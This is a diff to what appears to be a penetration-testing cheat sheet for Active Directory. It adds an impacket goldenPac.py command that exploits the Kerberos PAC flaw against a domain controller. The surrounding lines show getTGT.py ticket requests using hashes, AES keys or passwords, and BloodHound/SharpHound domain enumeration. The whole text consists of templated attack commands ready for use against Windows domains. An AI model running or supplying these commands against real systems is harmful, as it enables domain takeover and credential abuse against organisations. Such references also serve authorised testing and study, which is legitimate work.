@@ -677,6 +677,10 @@ python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME} -
 python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME} -aesKey {AES KEY}
 python3 /usr/share/doc/python3-impacket/examples/getTGT.py {DOMAIN}/{USERNAME}:{PASSWORD}
 
+# Kerberos PAC enabled
+python3 /usr/share/doc/python3-impacket/examples/goldenPac.py {DOMAIN}/{USER}@{FULL DOMAIN} -dc-ip {IP ADDRESS} -target-ip {IP ADDRESS}
+
+
 # Bloodhound
 sudo neo4j console                          # LHOST
 ./SharpHound.exe -c all                     # RHOST
